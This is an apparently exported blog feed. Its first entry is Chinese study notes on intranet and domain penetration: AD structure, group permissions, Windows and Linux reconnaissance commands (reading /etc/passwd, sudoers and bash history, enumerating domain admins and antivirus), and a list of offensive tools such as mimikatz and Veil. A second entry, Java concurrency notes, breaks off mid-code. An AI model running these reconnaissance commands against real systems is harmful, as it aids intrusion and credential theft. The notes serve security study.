<h1 id="四、内网结构"><a href="#四、内网结构" class="headerlink" title="四、内网结构"></a>四、内网结构</h1><p><a href="https://www.freebuf.com/articles/network/306068.html">https://www.freebuf.com/articles/network/306068.html</a></p>
<h2 id="1、工作组Work-Group"><a href="#1、工作组Work-Group" class="headerlink" title="1、工作组Work Group:"></a>1、工作组Work Group:</h2><p>是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><p>域是一个有安全边界的计算机集合，域通过安全边界来隔离本域和外部资源。</p>
<p>域又可以再进一步的分类：</p>
<ul>
<li>单域                  就两台主机，一台DC一台备份DC</li>
<li>父域，子域       划分多个域，第一个域为父域，其他为子域</li>
<li>域树（tree）     域树是多个域通过建立信任关系组成的集合。</li>
<li>域林（forest）  域林是由一个或多个没有形成连续名字空间的域树组成，它和域树最大的区别就是域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</li>
<li>DNS域名服务器   DNS服务器，计算机使用DNS来定位DC、服务器和其他计算机的，所以域的名字就是DNS域的名字。</li>
</ul>
<h2 id="3、活动目录-AD"><a href="#3、活动目录-AD" class="headerlink" title="3、活动目录(AD)"></a>3、活动目录(AD)</h2><p>简写为<code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务</p>
<p><strong>活动目录的功能：</strong></p>
<ul>
<li>账户集中管理</li>
<li>软件集中管理</li>
<li>环境集中管理</li>
<li>增强安全性</li>
<li>更可靠、更短的宕机时间</li>
</ul>
<p><strong>活动目录与域控制器的区别</strong></p>
<p>由域网络中的众多对象组成的层次结构的数据库被称为活动目录数据库（AD库）。要实现域环境其实就是要安装AD，如果内网中某台机器安装了AD，那么他就是DC。也就实现了只需要在活动目录中对某个账号修改一次密码，在整个域中任意一台机器上都可使用该账号登录。<br>方便了DC对域内其他机器的统一管理</p>
<h2 id="4、安全域"><a href="#4、安全域" class="headerlink" title="4、安全域"></a>4、安全域</h2><p><strong>安全域的划分目的：</strong></p>
<p>将一组安全等级相同的计算机划如同一网段。</p>
<p>这个网段内的计算机拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络控制策略，从而允许哪些IP地址访问域，允许此域访问哪些IP地址和网段进行设置。</p>
<p>这些措施将使得网络风险最小化，当攻击发生时，可以尽可能地将威胁隔离从而降低对域内计算机的影响</p>
<p><strong>DMZ</strong></p>
<p>DMZ<code>demilitarized zone</code>，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
<p><strong>简答来说：DMZ就是将内网与外网进行隔离，存放一些必须公开的服务器设施，用来对外提供服务。</strong></p>
<p><strong>办公区</strong></p>
<p>公司员工日常的工作区，一般会安装防病毒软件、主机入侵检测产品等。办公区般能够访问DMZ。如果运维人员也在办公区，那么部分主机也能访问核心数据区（很多大企业还会使用堡垒机来统一管理用户的登录行为）。</p>
<p>攻击者如果想进入内网，一般会使用鱼叉攻击、水坑攻击，当然还有社会工程学手段。办公区人员多而杂，变动也很频繁，在安全管理上可能存在诸多漏洞，是攻击者进入内网的重要途径之一。</p>
<p><strong>核心区</strong></p>
<p>存储企业最重要的数据、文档等信息资产，通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少的主机能够访问。从外部是很难直接访问核心区的。</p>
<p>一般来说，能够直接访问核心区的只有运维人员或者IT部门的主管，所以，攻击者会重点关注这些用户的信息（攻击者在内网中进行横向移动攻击时，会优先查找这些主机）</p>
<h1 id="五、域权限"><a href="#五、域权限" class="headerlink" title="五、域权限"></a>五、域权限</h1><ol>
<li><p>域本地组</p>
<p>多域用户访问单域资源（访问同一域），不能嵌套在其他组中，只能在其所在域内指派权限</p>
</li>
<li><p>全局组</p>
<p>单域用户访问多域资源（必须是同一域里面的用户），能够嵌套在其他组中，可在域林中的任何域指派权限</p>
</li>
<li><p>通用组</p>
<p>多域用户访问多域资源，成员信息不保存在域控制器中，而是保存在全局编录（GC）中，任何变化都会导致全林复制</p>
</li>
</ol>
<h3 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A：Account，用户账号</span><br><span class="line"></span><br><span class="line">G：Global Group，全局组</span><br><span class="line"></span><br><span class="line">U：Universal Group，通用组</span><br><span class="line"></span><br><span class="line">DL：Domain Local Group，域本地组</span><br><span class="line"></span><br><span class="line">P：Permission，许可，资源权限</span><br><span class="line">先将用户账号添加至全局组中，再将全局组添加至域本地组中，然后为域本地组分配资源权限</span><br></pre></td></tr></table></figure>

<h3 id="域内权限解读"><a href="#域内权限解读" class="headerlink" title="域内权限解读"></a>域内权限解读</h3><ul>
<li>域本地组：来自全林作用于本域</li>
<li>全局组：来组本域作用于全林</li>
<li>通用组：来自全林作用于全林</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地域组的权限</span><br><span class="line">Administrators（管理员组） ————最重要的权限</span><br><span class="line"></span><br><span class="line">Remote Desktop Users（远程登录组）</span><br><span class="line"></span><br><span class="line">Print Operators（打印机操作员组）</span><br><span class="line"></span><br><span class="line">Account Operators（帐号操作员组）</span><br><span class="line"></span><br><span class="line">Server Operaters（服务器操作员组）</span><br><span class="line"></span><br><span class="line">Backup Operators（备份操作员组）</span><br><span class="line">全局组、通用组的权限：</span><br><span class="line">Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</span><br><span class="line"></span><br><span class="line">Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</span><br><span class="line"></span><br><span class="line">Schema Admins（架构管理员组）————最重要的权限</span><br><span class="line"></span><br><span class="line">Domain Users（域用户组)</span><br></pre></td></tr></table></figure>

<h1 id="六、内网信息收集-重点"><a href="#六、内网信息收集-重点" class="headerlink" title="六、内网信息收集            重点"></a>六、内网信息收集            重点</h1><p>目标资产信息搜集的程度，决定渗透过程的复杂程度。<br>目标主机信息搜集的深度，决定后渗透权限持续把控。<br>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><strong>系统相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统信息</span><br><span class="line">systeminfo /all</span><br><span class="line"></span><br><span class="line">#查看补丁列表</span><br><span class="line">wmic qfe getCaption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#查看主机开机时间</span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line">schtasks /query /fo LIST /v             #query显示所有计划任务</span><br></pre></td></tr></table></figure>

<p><strong>用户相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#检查当前用户，权限</span><br><span class="line">whoami /user &amp;&amp; whoami /priv</span><br><span class="line">whoami /all        #查看当前域并获取域SID</span><br><span class="line"></span><br><span class="line">#查看在线用户信息</span><br><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>

<p><strong>程序相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看杀毒软件</span><br><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName /Format:List</span><br><span class="line"></span><br><span class="line">#查看安装的程序和版本</span><br><span class="line">wmic product getname,version</span><br><span class="line"></span><br><span class="line">#查询运行的进程</span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line">wmic process getprocessid,executablepath,name      #显示进程的路径、名称、pid</span><br><span class="line">wmic servicelist brief                             #查看本机服务</span><br><span class="line"></span><br><span class="line">#远程桌面连接历史记录</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">#查看自启动程序列表</span><br><span class="line">wmic startuo getcommand,caption</span><br></pre></td></tr></table></figure>

<p><strong>网络连接相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#tcp/udp网络连接状态，端口信息</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">ipconfig /all              #查询本机IP段，所在域等</span><br><span class="line">route print                #打印路由信息</span><br><span class="line">arp -a                   #查看arp缓存，可以发现内网主机</span><br><span class="line"></span><br><span class="line">#查看局域网信息</span><br><span class="line">net view            #查看同一域内机器列表</span><br><span class="line">net view \\ip       #查看某ip共享</span><br><span class="line">net view \\GHQ      #查看GHQ计算机的共享资源列表</span><br><span class="line">net view /domain    #查看内网存在多少个域</span><br><span class="line">net view /domin:XYZ  #查看XYZ域的机器列表</span><br><span class="line">net accounts /domain  #查询域用户密码过期等信息</span><br><span class="line"></span><br><span class="line">#查看本机共享</span><br><span class="line">net share</span><br><span class="line">wmic share getname,path,status</span><br></pre></td></tr></table></figure>

<p><strong>域相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#判断是否存在域</span><br><span class="line">net config workstation    # 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等</span><br><span class="line">net view /domain          # 查看域</span><br><span class="line"></span><br><span class="line">#查看主域服务器</span><br><span class="line">net time /domain           #主域服务器会同时作为时间服务器</span><br><span class="line"></span><br><span class="line">nltest /DCLIST:god         #查看域控制器主机名，god为域名</span><br><span class="line"></span><br><span class="line">#查看域用户相关信息</span><br><span class="line">net user /domain          #显示所在域的用户</span><br><span class="line">net user 域用户 /domain    #获取域用户详细信息</span><br><span class="line">net user /domain XXX 123456 #修改用户密码，需要域管理员权限</span><br><span class="line"></span><br><span class="line">net group /domain       #查看域内用户组列表</span><br><span class="line">net group &quot;domain admins&quot;/domain       #获取域管理员列表</span><br><span class="line">net group &quot;domain controllers&quot;/domain  #查看域控制器组</span><br><span class="line">net group &quot;domain computers&quot;/domain   #查看域机器</span><br><span class="line"></span><br><span class="line">#列出域信任关系</span><br><span class="line">nltest /domain_trusts      #列出域与域之间的信任关系</span><br><span class="line"></span><br><span class="line">#获得域内用户详细信息</span><br><span class="line">wmic useraccount get/all   #可以获取到域用户的用户名、描述信息、SID、域名、状态等。</span><br></pre></td></tr></table></figure>

<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><strong>系统相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue         #查看系统名称</span><br><span class="line">cat /etc/Lsb-release   #查看系统名称,版本号</span><br><span class="line">cat /etc/*release      #查看linux发行信息</span><br><span class="line">uname -an              #查看内核版本</span><br><span class="line">cat /proc/version      #查看内核信息</span><br><span class="line">cat /proc/cpuinfo      #查看cpu信息</span><br><span class="line"></span><br><span class="line">#查看文件系统</span><br><span class="line">df -a </span><br><span class="line"></span><br><span class="line">#查看系统日志</span><br><span class="line">sudo cat /var/log/syslog</span><br><span class="line"></span><br><span class="line">#查看命令记录</span><br><span class="line">cat /root/.bash_history</span><br><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>

<p><strong>用户相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami     #查看当前shell权限</span><br><span class="line">id         #查看当前用户的权限和所在的管理组</span><br><span class="line"></span><br><span class="line">#查看登录信息</span><br><span class="line">w</span><br><span class="line">who</span><br><span class="line">last       #登入过的用户信息</span><br><span class="line">lastlog    #显示系统中所有用户最近一次登录信息</span><br><span class="line"></span><br><span class="line">#查看账号信息</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#列出目前用户可执行与无法执行的指令</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><strong>网络相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询本机IP信息</span><br><span class="line">ifconfig</span><br><span class="line">ip a</span><br><span class="line"></span><br><span class="line">#查看端口信息</span><br><span class="line">netstat -anpt</span><br><span class="line"></span><br><span class="line">#查看网卡配置</span><br><span class="line"> cat /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p><strong>程序相关</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看进程信息</span><br><span class="line">ps -ef  #标准格式显示</span><br><span class="line">ps aux  #BSD格式显示</span><br><span class="line"></span><br><span class="line">#资源占有情况</span><br><span class="line">top -c</span><br><span class="line"></span><br><span class="line">cat /etc/inetd.conf        #由inetd管理的服务列表</span><br><span class="line">cat /etc/xinetd.conf       #由xinetd管理的服务列表</span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line">crontab -l</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line">#查看开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br></pre></td></tr></table></figure>

<p><strong>配置信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables –L   #查看防火墙配置（注意需要root权限）</span><br><span class="line">cat /etc/resolv.conf   #查看dns配置文件</span><br><span class="line">cat /etc/network/interfaces    #查看网卡配置文件</span><br><span class="line">cat /etc/apache2/apache2.conf   #查看apache配置文件</span><br><span class="line">cat /etc/my.conf               #mysql配置</span><br><span class="line"></span><br><span class="line">#查看suid文件</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">#最近五天的文件</span><br><span class="line">find / -ctime +1 -ctime -5</span><br></pre></td></tr></table></figure>

<h1 id="七、内网域渗透常用工具"><a href="#七、内网域渗透常用工具" class="headerlink" title="七、内网域渗透常用工具"></a>七、内网域渗透常用工具</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、WCE</span><br><span class="line">WCE（Windows 凭据管理器）是安全人员广泛使用的一种安全工具，常用于列出登录会话以及添加、修改、和删除关联凭据（如LM hash、NTLM hash、明文密码和Kerberos票据）。</span><br><span class="line">2、mimikatz</span><br><span class="line">mimikatz主要用于从内存中获取明文密码、现金票据和密钥等。</span><br><span class="line">3、Responder</span><br><span class="line">Responder可以嗅探网络中的所有LLMNR包和获取各主机的信息。</span><br><span class="line">4、BeEF</span><br><span class="line">BeEF利用XSS通过Java Script对目标浏览器进行测试，同时可以配合MSF进行进一步渗透。</span><br><span class="line">5、DSHashes</span><br><span class="line">DSHashes主要从NTDSXtract中提取用户易于理解的散列值。</span><br><span class="line">6、PowerSploit</span><br><span class="line">PowerSploit是基于PowerShell的测试框架，主要用于信息收集、权限提升以及权限维持。</span><br><span class="line">7、Nishang</span><br><span class="line">Nishang也是一款基于PowerShell的测试工具，集成各类payload用于渗透测试。</span><br><span class="line">8、Empire</span><br><span class="line">类似于MSF，也是一款拥有丰富模块和接口的渗透测试工具。</span><br><span class="line">9、ps_encoder.py</span><br><span class="line">ps_encoder.py是使用base64封装的powershell命令包，目的是混淆和压缩代码。</span><br><span class="line">10、smbexec</span><br><span class="line">smbexec是使用Samba工具的快速PsExec类工具，它通过ipc$进行连接，将psexec.exe释放到目标主机中，铜鼓欧服务管理（SCManager）进程创建psexecsvc服务并启动服务并能直接提供目标主机的system权限。</span><br><span class="line">11、the-backdoor-factory-master</span><br><span class="line">the-backdoor-factory-master可以对PE、ELF、Mach-O等二进制文件注入shellcode。</span><br><span class="line">12、Veil</span><br><span class="line">Veil用于生成绕过常见防病毒解决方案的MSF有效载荷。</span><br><span class="line">13、MSF</span><br><span class="line">世界上最常用的渗透测试框架。</span><br><span class="line">14、Cobalt Strike</span><br><span class="line">Cobalt Strike主要用于内网渗透，并提供团队协作功能。</span><br><span class="line">15、Nmap</span><br><span class="line">Nmap主要用于发现主机、扫描端口、识别服务和操作系统等</span><br><span class="line">16、Wireshark</span><br><span class="line">Wireshark主要用于网络协议和数据包分析，可以通过网络接口对整个网络接口进行监听。</span><br><span class="line">17、Putty</span><br><span class="line">Putty在windows下主要作为连接SSH 以及 Telnet 的客户端。</span><br><span class="line">18、sqlmap</span><br><span class="line">sqlmap主要用于检测和利用SQL注入漏洞。</span><br><span class="line">19、Burp Suite</span><br><span class="line">Burp Suite主要用于对web应用程序进行测试，最重要的几个模块为Intruder、Proxy、Repeater，用于抓包分析、参数爆破以及重放攻击。</span><br><span class="line">20、Hydra</span><br><span class="line">Hydra（九头蛇）主要用于登录爆破。</span><br><span class="line">21、Getif</span><br><span class="line">Getif主要用于收集SNMP设备的信息。</span><br><span class="line">22、Cain&amp;Abel</span><br><span class="line">Cain&amp;Abel是windows中的一个密码恢复工具，可以通过嗅探网络，来破解加密密码、记录VoIP会话、恢复无线网络密钥、显示面膜框、发现缓存中的密码、分析路由信息、并能恢复各种密码。</span><br></pre></td></tr></table></figure>

<p>更详细见<a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
<p>域渗透基础知识大全：<a href="https://decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">https://decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</a>    重点</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>JUC并发编程</title>
    <url>/2024/10/07/JUC%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<p>记录学习Java JUC</p>
<span id="more"></span>

<h1 id="1、JUC介绍"><a href="#1、JUC介绍" class="headerlink" title="1、JUC介绍"></a>1、JUC介绍</h1><p><strong>源码+官方文档</strong></p>
<p>java.util.concurrent</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/2ddf094e6a13c1260581e88ddaafb21b--dba2--image-20241007142426475.png" alt="image-20241007142426475"></p>
<p>普通的线程代码Thread</p>
<p>Runnable没有返回值，效率相比Callable相对较低</p>
<h1 id="2、线程与进程"><a href="#2、线程与进程" class="headerlink" title="2、线程与进程"></a>2、线程与进程</h1><blockquote>
<p>进程、线程</p>
</blockquote>
<p>进程：就比如你桌面上的任何一个软件，QQ、微信这些</p>
<p>一个进程可以包含多个线程，至少也有一个线程</p>
<p>Java默认就是有两个线程：①main线程。②GC垃圾回收线程</p>
<p>但是有一个问题就是？</p>
<p><strong>Java真的可以开启线程吗？  —–不可以！</strong></p>
<p>Thread部分源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This method is not invoked for the main method thread or &quot;system&quot;</span></span><br><span class="line"><span class="comment">     * group threads created/set up by the VM. Any new functionality added</span></span><br><span class="line"><span class="comment">     * to this method in the future may have to also be added to the VM.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * A zero status value corresponds to state &quot;NEW&quot;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (threadStatus != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalThreadStateException</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Notify the group that this thread is about to be started</span></span><br><span class="line"><span class="comment">     * so that it can be added to the group&#x27;s list of threads</span></span><br><span class="line"><span class="comment">     * and the group&#x27;s unstarted count can be decremented. */</span></span><br><span class="line">    group.add(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">started</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        start0();</span><br><span class="line">        started = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!started) &#123;</span><br><span class="line">                group.threadStartFailed(<span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ignore) &#123;</span><br><span class="line">            <span class="comment">/* do nothing. If start0 threw a Throwable then</span></span><br><span class="line"><span class="comment">              it will be passed up the call stack */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本地方法，底层的C++ java无法直接操作硬件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">start0</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/e4042aa096489027d5a5149a194e444f--1875--image-20241007143609517.png" alt="image-20241007143609517">并发、并行</p>
<p>并发（多线程操作同一个资源）</p>
<ul>
<li>CPU单核，模拟出来多条线程，天下武功，唯快不破，快速交替</li>
</ul>
<p>并行（多个人一次行走）</p>
<ul>
<li>CPU多核，多个线程可以同时执行;线程池</li>
</ul>
<p>查询cpu核数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//查询cpu核数</span></span><br><span class="line">        <span class="comment">//CPU 密集型，IO密集型</span></span><br><span class="line">        System.out.println(Runtime.getRuntime().availableProcessors());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并发编程的本质：<strong>充分利用CPU的资源</strong></p>
<h1 id="3、回顾多线程"><a href="#3、回顾多线程" class="headerlink" title="3、回顾多线程"></a>3、回顾多线程</h1><p>线程有几个状态 – 6种   直接就是能够看源码</p>
<pre><code>public enum State &#123;
    /**
     * 新建
     */
    NEW,

    /**
     * 运行
     */
    RUNNABLE,

    /**
     * 阻塞
     */
    BLOCKED,

    /**
     * 等待，死死的等
     */
    WAITING,

    /**
     * 超时等待
     */
    TIMED_WAITING,

    /**
     * 停止
     */
    TERMINATED;
&#125;
</code></pre>
<blockquote>
<p>wait和sleep的区别</p>
</blockquote>
<ol>
<li><p>来自不同的类</p>
<ul>
<li><p>wait—-&gt;Object</p>
</li>
<li><p>sleep—-&gt;Thread</p>
</li>
</ul>
</li>
<li><p>关于锁的释放</p>
<ul>
<li>wait会释放锁</li>
<li>sleep不会释放锁，抱着锁睡觉</li>
</ul>
</li>
<li><p>使用的范围是不同的</p>
<ul>
<li>wait必须在同步代码块中</li>
<li>sleep可以在任何地方睡</li>
</ul>
</li>
</ol>
<h1 id="4、传统的Synchronized锁"><a href="#4、传统的Synchronized锁" class="headerlink" title="4、传统的Synchronized锁"></a>4、传统的Synchronized锁</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JUCDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Ticket</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ticket</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)&#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (number &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;买了第&quot;</span> + (number--) + <span class="string">&quot;张票&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/c64f5494484b8e7234a3701e9859968e--6fcc--image-20241007145819476.png" alt="image-20241007145819476"></p>
<h1 id="5、Lock锁"><a href="#5、Lock锁" class="headerlink" title="5、Lock锁"></a>5、Lock锁</h1><p>加锁，释放锁</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/31d30e67e91ca403f77b1d79ff83854f--4308--image-20241007150354933.png" alt="image-20241007150354933"></p>
<p>实现类（可重入锁，读锁，写锁）</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/31664e900c7c465ea6434932a42d1e4f--c0fd--image-20241007150402819.png" alt="image-20241007150402819"></p>
<p>可重入锁构造方法</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/fc7c55397daed14671d863d701b29fd5--b6f6--image-20241007150515820.png" alt="image-20241007150515820"></p>
<p>公平锁：十分公平，可以先来后到</p>
<p>非公平锁：十分不公平，可以插队（默认）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.Lock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JUCDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Ticket2</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ticket2</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.创建锁 Lock lock = new ReentrantLock();</span></span><br><span class="line"><span class="comment"> * 2.加锁 lock.lock();</span></span><br><span class="line"><span class="comment"> * 3.释放锁 lock.unlock();</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建锁</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//加锁</span></span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;买了第&quot;</span> + (number--) + <span class="string">&quot;张票&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//释放锁</span></span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 